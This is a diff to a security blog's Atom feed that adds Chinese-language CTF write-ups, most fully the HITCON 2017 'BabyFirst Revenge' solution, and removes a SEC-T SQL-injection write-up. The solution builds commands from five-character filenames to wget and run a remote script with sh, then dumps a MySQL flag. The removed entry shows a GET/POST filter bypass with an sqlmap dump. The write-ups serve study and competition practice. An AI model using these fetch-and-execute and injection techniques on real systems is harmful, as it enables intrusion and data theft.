@@ -199,6 +199,143 @@
   </entry>
   
   <entry>
+    <title>HITCON CTF 2017-BabyFirst Revenge-writeup</title>
+    <link href="http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/"/>
+    <id>http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/</id>
+    <published>2017-11-04T15:32:08.000Z</published>
+    <updated>2017-11-06T04:51:24.649Z</updated>
+    
+    <content type="html"><![CDATA[<p>HITCON CTF 2017-BabyFirst Revenge-writeup<br><a id="more"></a></p>
+<h1 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Do you remember BabyFirst from HITCON CTF 2015?</div><div class="line">This is the harder version!</div><div class="line">http://52.199.204.34/</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>点开后，发现给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">   $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">   @mkdir($sandbox);</div><div class="line">   @chdir($sandbox);</div><div class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</div><div class="line">	   @exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</div><div class="line">	   @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</div><div class="line">   &#125;</div><div class="line">   highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure></p>
+<p>简要的分析一下：</p>
+<ol>
+<li>对每个REMOTE_ADDR有对应的sandbox</li>
+<li>能执行长度&lt;=5的命令</li>
+<li>提供了reset功能。</li>
+</ol>
+<p>之前在总结时，有遇到过，见<a href="https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html" target="_blank" rel="external">chybeta:wafbypass</a>，github地址为：<a href="https://github.com/CHYbeta/WAF-Bypass" target="_blank" rel="external">https://github.com/CHYbeta/WAF-Bypass</a></p>
+<p>原本的长度为8，而这里为5，条件苛刻了许多。在原本的场景中，我们可以通过构造文件名，之后利用ls命令及其参数将所需的shell命令写入到一个新文件中，并sh执行该新文件从而达到任意命令执行。这里同样可以借鉴其思路。关键点有两个：</p>
+<ol>
+<li>长度限制</li>
+<li>写入的顺序</li>
+</ol>
+<p>这里先补充一些基本的知识。在linux中，倘若命令过长，可以用续行符（<code>\</code>）来将一行命令变为多行来写。具体例子如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat chybeta</div><div class="line"><span class="built_in">echo</span>\</div><div class="line"> <span class="string">"chy\</span></div><div class="line">beta"</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ sh chybeta</div><div class="line">chybeta</div></pre></td></tr></table></figure></p>
+<p>在文件chybeta中，通过<code>\</code>将命令<code>echo &quot;chybeta&quot;</code>分成了三个部分。</p>
+<p>倘若有一行出错呢？见下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat chybeta</div><div class="line">atebyhc</div><div class="line"><span class="built_in">echo</span>\</div><div class="line"> <span class="string">"chy\</span></div><div class="line">beta"</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ sh chybeta</div><div class="line">chybeta: 1: chybeta: atebyhc: not found</div><div class="line">chybeta</div></pre></td></tr></table></figure></p>
+<p>在最前我加了一句<code>atebyhc</code>，显然这不是命令，但这并不妨碍之后语句的执行，仍然能在<code>\</code>的作用下打印出<code>chybeta</code>。</p>
+<p>接下来考虑如何构造文件。由于长度的限制，我们不能通过直接的<code>ls -t</code>来通过时间来进行文件名排序并构造。但我们可以曲线救国，先想办法把<code>ls -t&gt;q</code>写入到某个文件中，假设为文件a，然后sh执行文件a，这样命令<code>ls -t</code>的结果就能输出到文件q中。</p>
+<p>我最后形成的payload1如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;-t\</div><div class="line">&gt;\&gt;q</div><div class="line">&gt;l\</div><div class="line">&gt;s\ \</div><div class="line">ls&gt;a</div><div class="line">ls&gt;&gt;a</div></pre></td></tr></table></figure></p>
+<p>这里详细解释。在默认情况下，命令ls，根据名称排序，空格等最前，数字其次，字母最后。当我们执行了前四条语句后，这时文件夹中情况如下(这是我本地环境)：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/2.png?raw=true" alt=""></p>
+<p>接着执行<code>ls&gt;a</code>后，a中文件内容：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/3.png?raw=true" alt=""></p>
+<p>紧接着执行<code>ls&gt;&gt;a</code>，这个命令会将<code>ls</code>的结果追加到文件a中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/4.png?raw=true" alt=""></p>
+<p>其文本内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div></pre></td></tr></table></figure></p>
+<p>由前面所述，错误的命令不会影响后面正确语句的正确执行，所以第一行到第三行是错误的命令可忽略，并且第三行<code>a</code>后没有续行符，这不会影响到下一行。从第四行到第七行，由于续行符（<code>\</code>），可以构成如下的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div></pre></td></tr></table></figure></p>
+<p>也即<code>ls -t&gt;q</code>，能够根据文件的时间来进行排序并将结果写入到文件q中。剩余几行，对结果无影响可忽略。</p>
+<p>接下来延续以前的套路，想办法wget远程的某个文件，这样文件中能藏有足够长的payload。为方便起见-，可以将远程服务器的ip转换为十进制，这样不用考虑小数点带来的影响。假设我们的ip转换成十进制后为：2077173<em>48（hh这里我隐去一位数字）。则命令`wget 2077173</em>48<code>，会从</code>2077173*48<code>处下载并默认保存为index.html。考虑到长度的限制，我们需要将上述命令分段成长度小于等于5，并用续行符</code>`隔开。考虑到，前面是使用<code>ls -t&gt;q</code>，而参数<code>-t</code>，会让新生成的文件排在前面，越早生成的文件排在后面。所以构造这一部分的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;*48</div><div class="line">&gt;173\</div><div class="line">&gt;077\</div><div class="line">&gt;\ 2\</div><div class="line">&gt;et\</div><div class="line">&gt;wg\</div></pre></td></tr></table></figure></p>
+<p>此时文件目录为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/5.png?raw=true" alt=""></p>
+<p>接着执行命令<code>sh a</code>，注意文件a是我们第一阶段时生成的，其中包含命令<code>ls -t&gt;q</code>。运行完后查看新生成的文件q：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/6.png?raw=true" alt=""></p>
+<p>如前所述，这里构成了一个新的命令<code>wget 2077173*48</code>。注意在<code>*48</code>的下一行是文件<code>a</code>的名字，由于它后面没有<code>\</code>，并且字母顺序在<code>s\</code>之前，刚好起了一个分割的作用。</p>
+<p>接下来执行命令<code>sh q</code>，这里为演示方便在本地shell中操作，这跟访问<code>?cmd=sh%20a</code>的效果是一样的:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/7.png?raw=true" alt=""></p>
+<p>可以发现成功的下载了远程的文件并保存到index.html中，而index.html是存放在我们自己的服务器上的，只要执行<code>sh%20i*</code>，注意这里用来通配符<code>*</code>，就能够执行<code>sh index.html</code>，从而执行其中的命令。</p>
+<p>接下来，需要不断的进行探索flag的所在地。可以按照下述命令来实现命令的执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?cmd=rm%20i*   // 删除index.html</div><div class="line">?cmd=sh%20a    // 执行文件q，即wget新的index.html</div><div class="line">?cmd=sh%20i*   // 执行index.html中的shell命令</div></pre></td></tr></table></figure></p>
+<p>在经过一番摸索后，发现在home目录的某个用户的主目录下有README.txt，其内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Flag is in the MySQL database</div><div class="line">fl4444g / SugZXUtgeJ52_Bvr</div></pre></td></tr></table></figure></p>
+<p>接下去通过替换index.html的内容。</p>
+<p>index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;show databases;&quot; &gt; kk5</div></pre></td></tr></table></figure></p>
+<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk5，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk5，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Database</div><div class="line">information_schema</div><div class="line">fl4gdb</div></pre></td></tr></table></figure></p>
+<p>index.html:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x666c34676462&quot; &gt; kk7</div></pre></td></tr></table></figure></p>
+<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk7，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk7，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GROUP_CONCAT(table_name)</div><div class="line">this_is_the_fl4g</div></pre></td></tr></table></figure></p>
+<p>index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;(SELECT * FROM fl4gdb.this_is_the_fl4g&quot; &gt;　kk9</div></pre></td></tr></table></figure></p>
+<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk9，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk9，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secret</div><div class="line">hitcon&#123;idea_from_phith0n,thank_you:)&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/8.png?raw=true" alt=""></p>
+<p>还愣着干啥，膜P师傅啊!</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;HITCON CTF 2017-BabyFirst Revenge-writeup&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WordPress中的SQL注入与格式化字符串问题</title>
+    <link href="http://chybeta.github.io/2017/11/01/WordPress%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/"/>
+    <id>http://chybeta.github.io/2017/11/01/WordPress中的SQL注入与格式化字符串问题/</id>
+    <published>2017-11-01T15:11:48.000Z</published>
+    <updated>2017-11-01T15:37:28.437Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="php中的格式化字符串"><a href="#php中的格式化字符串" class="headerlink" title="php中的格式化字符串"></a>php中的格式化字符串</h2><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="NextGEN-Gallery-for-WordPress"><a href="#NextGEN-Gallery-for-WordPress" class="headerlink" title="NextGEN Gallery for WordPress"></a>NextGEN Gallery for WordPress</h2><p><a href="https://blog.sucuri.net/2017/02/sql-injection-vulnerability-nextgen-gallery-wordpress.html" target="_blank" rel="external">https://blog.sucuri.net/2017/02/sql-injection-vulnerability-nextgen-gallery-wordpress.html</a></p>
+<h2 id="Wordpress-SQLi"><a href="#Wordpress-SQLi" class="headerlink" title="Wordpress SQLi"></a>Wordpress SQLi</h2><p>8.23<br><a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">Wordpress SQLi</a></p>
+<p><a href="https://paper.seebug.org/386/" target="_blank" rel="external">从WordPress SQLi谈PHP格式化字符串问题</a></p>
+<h2 id="WordPress-4-8-3"><a href="#WordPress-4-8-3" class="headerlink" title="WordPress 4.8.3"></a>WordPress 4.8.3</h2><p>9.</p>
+<ul>
+<li><a href="https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html" target="_blank" rel="external">Disclosure: WordPress WPDB SQL Injection - Technical</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h1&gt;&lt;h2 id=&quot;php中的格式化字符串&quot;&gt;&lt;a href=&quot;#php中的格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;php
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+    
+      <category term="SQL注入" scheme="http://chybeta.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SWPU CTF 2017-Web-writeup</title>
+    <link href="http://chybeta.github.io/2017/11/01/SWPU-CTF-2017-Web-writeup/"/>
+    <id>http://chybeta.github.io/2017/11/01/SWPU-CTF-2017-Web-writeup/</id>
+    <published>2017-11-01T13:23:12.000Z</published>
+    <updated>2017-11-05T12:32:45.027Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="http://www.th1s.cn/index.php/2017/11/05/147.html" target="_blank" rel="external">http://www.th1s.cn/index.php/2017/11/05/147.html</a></p>
+<h1 id="Web1-你能进入后台吗？"><a href="#Web1-你能进入后台吗？" class="headerlink" title="Web1 你能进入后台吗？"></a>Web1 你能进入后台吗？</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">地址： http://39.106.13.162/login.php </div><div class="line">登录进来就给你flag啦(#.#)</div><div class="line"></div><div class="line">hint: php-screw   index.php.bak</div></pre></td></tr></table></figure>
+<h1 id="web2-web-catch-me-if-you-can"><a href="#web2-web-catch-me-if-you-can" class="headerlink" title="web2 web catch me if you can"></a>web2 web catch me if you can</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">地址：http://47.93.205.124/ </div><div class="line">黑客入侵了我的网站并挂了黑页，最重要的是还偷走了我留给各位师傅的flag…请各位师傅帮助我抓住这个黑客并找到我的flag</div></pre></td></tr></table></figure>
+<h1 id="web3-我们来做个小游戏吧"><a href="#web3-我们来做个小游戏吧" class="headerlink" title="web3 我们来做个小游戏吧"></a>web3 我们来做个小游戏吧</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">地址：http://47.104.18.71/www.zip </div><div class="line">欧洲人据说可以为所欲为？</div></pre></td></tr></table></figure>
+<h1 id="web4-师傅们一起来找flag"><a href="#web4-师傅们一起来找flag" class="headerlink" title="web4 师傅们一起来找flag"></a>web4 师傅们一起来找flag</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">地址:http://39.106.16.58/index.php </div><div class="line">flag不小心丢失了，师傅们来帮忙找找呀！(不用扫描)</div></pre></td></tr></table></figure>
+<h1 id="web5-python-sandbox"><a href="#web5-python-sandbox" class="headerlink" title="web5 python sandbox"></a>web5 python sandbox</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">地址：http://47.95.252.234</div><div class="line">Web code editor is convenient to Exercise programming!</div></pre></td></tr></table></figure>
+<h1 id="web-6-You-Think-I-Think"><a href="#web-6-You-Think-I-Think" class="headerlink" title="web 6 You Think I Think"></a>web 6 You Think I Think</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">地址：http://39.106.11.158/web1/  I Think You Can Think It！</div></pre></td></tr></table></figure>
+<h1 id="web7-flag-flag"><a href="#web7-flag-flag" class="headerlink" title="web7 flag!flag"></a>web7 flag!flag</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://39.106.13.2/web2/file.php?file=index</div><div class="line"></div><div class="line">小明把flag藏在数据库里面，请各位大师傅帮忙找出来吧</div></pre></td></tr></table></figure>
+<h1 id="web8-偷懒的出题人"><a href="#web8-偷懒的出题人" class="headerlink" title="web8 偷懒的出题人"></a>web8 偷懒的出题人</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://39.106.11.158/web1/</div><div class="line"></div><div class="line">I Think You Can Think It！</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;http://www.th1s.cn/index.php/2017/11/05/147.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.th1s.cn/index.php/2017/11/05/147.htm
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Node.js中的反序列化漏洞：CVE-2017-5941</title>
     <link href="http://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/"/>
     <id>http://chybeta.github.io/2017/11/01/Node-js中的反序列化漏洞：CVE-2017-5941/</id>
@@ -523,9 +660,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="XSS" scheme="http://chybeta.github.io/tags/XSS/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -816,9 +953,9 @@
     
       <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
     
   </entry>
   
@@ -1378,126 +1515,9 @@
     
       <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
       <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SEC-T CTF2017-Naughty ads-writeup</title>
-    <link href="http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/"/>
-    <id>http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/</id>
-    <published>2017-09-14T02:12:24.000Z</published>
-    <updated>2017-09-17T10:44:01.133Z</updated>
-    
-    <content type="html"><![CDATA[<p>SEC-T CTF2017-Naughty ads-writeup<br>sql注入<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</div><div class="line">Solves: 40</div><div class="line">Service: http://naughtyads.alieni.se/</div><div class="line">Author: avlidienbrunn</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>扫描器扫到robots.txt ，访问：<a href="http://naughtyads.alieni.se/robots.txt" target="_blank" rel="external">http://naughtyads.alieni.se/robots.txt</a></p>
-<p>有一个admin，但访问需要输入账号和密码。</p>
-<p>尝试访问： <a href="http://naughtyads.alieni.se/index.phps" target="_blank" rel="external">http://naughtyads.alieni.se/index.phps</a> 。得到源代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">require_once</span> <span class="string">'lib.php'</span>;</div><div class="line">header(<span class="string">'X-XSS-Protection: 0'</span>);</div><div class="line">$cols = <span class="keyword">array</span>(</div><div class="line">    <span class="string">"e8c4-437b-9476"</span>,</div><div class="line">    <span class="string">"849e-416e-acf7"</span>,</div><div class="line">    <span class="string">"7f9d-470f-8698"</span>,</div><div class="line">    <span class="string">"c8bb-4695-93f7"</span>,</div><div class="line">    <span class="string">"5fbc-4729-8821"</span>,</div><div class="line">    <span class="string">"3ad3-46c3-b975"</span>,</div><div class="line">    <span class="string">"f44f-4cc9-a5e0"</span>,</div><div class="line">    <span class="string">"0c3f-42c8-a0ae"</span></div><div class="line">    );</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</div><div class="line">    &#125;</div><div class="line">    $ad = get_ad($_GET[<span class="string">'id'</span>]);</div><div class="line">    <span class="meta">?&gt;</span></div><div class="line">    &lt;HTML&gt;</div><div class="line">    &lt;HEAD&gt;</div><div class="line">        &lt;TITLE&gt;NAUGHTY ADS ©<span class="number">1994</span>&lt;/TITLE&gt;</div><div class="line">    &lt;/HEAD&gt;</div><div class="line">    &lt;BODY BGCOLOR=<span class="string">"WHITE"</span>&gt;</div><div class="line">        &lt;CENTER&gt;</div><div class="line">        <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $ad[<span class="string">'description'</span>] <span class="meta">?&gt;</span>&lt;br /&gt;</div><div class="line">        &lt;a href=<span class="string">"/"</span>&gt;Home&lt;/a&gt;</div><div class="line">        &lt;/CENTER&gt;</div><div class="line">    &lt;/BODY&gt;</div><div class="line">    &lt;/HTML&gt;</div><div class="line">    <span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>对于 $_REQUEST[‘id’] ，进行了“严格”的正则匹配，不能正常的注出数据。接下来通过 $_GET[‘id’] 将其带入数据库中查询并返回结果给页面。</p>
-<p>这里考察了一个知识。<a href="http://php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="external">$_REQUEST</a>变量默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。在 php.ini 配置文件中，有一个参数variables_order<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/5.png?raw=true" alt=""></p>
-<p>其中几个字母（EGPCS）对应如下： Environment, Get, Post, Cookie, Server。这些字母的出现顺序，表明了数据的加载顺序。从三种默认配置来看，相对顺序均是<code>GP</code>，也就是说只要有POST参数进来，那么它就会覆盖同名的GET参数。如下图；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/6.png?raw=true" alt=""></p>
-<p>所以就本题而言，如果在GET参数id处注入数据（比如 union select），而同时我们又通过POST方法传入一个id参数，那么服务器检测的是无害的POST数据，而在进行查询时带入的是有害的GET数据。</p>
-<p>将如下数据包保存为test.txt，用sqlmap跑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /?id=* HTTP/1.1</div><div class="line">Host: naughtyads.alieni.se</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">DNT: 1</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 18</div><div class="line"></div><div class="line">id= 0c3f-42c8-a0ae</div></pre></td></tr></table></figure></p>
-<p>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -r test.txt -D naughty --dump</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/7.png?raw=true" alt=""></p>
-<p>得到账号密码，登陆 <a href="http://naughtyads.alieni.se/admin/" target="_blank" rel="external">http://naughtyads.alieni.se/admin/</a> 在Phone number处填上555-31338，提交后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</div></pre></td></tr></table></figure></p>
-<p>其实那个正则，是有问题的。。。很容易绕过的啦。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;SEC-T CTF2017-Naughty ads-writeup&lt;br&gt;sql注入&lt;br&gt;
-    
-    </summary>
-    
